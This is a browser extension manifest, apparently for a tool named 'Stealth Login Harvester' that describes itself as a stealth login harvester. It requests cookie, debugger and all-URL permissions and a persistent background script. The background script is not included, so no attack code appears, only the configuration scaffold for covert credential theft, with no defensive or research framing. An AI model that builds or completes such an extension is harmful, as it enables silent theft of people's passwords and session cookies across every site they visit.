{
  "name": "Stealth Login Harvester",
  "version": "0.1.0",
  "description": "Login harvester script for stealth",
  "permissions": [
    "cookies",
    "debugger",
    "*://localhost*",
    "https://*/",
    "activeTab",
    "<all_urls>",
    "storage"
  ],
  "browser_action": {
    "default_title": "Stealth Login Harvester"
  },
  "background": {
    "scripts": [
      "background.js"
    ],
    "persistent": true
  },
  "manifest_version": 2
}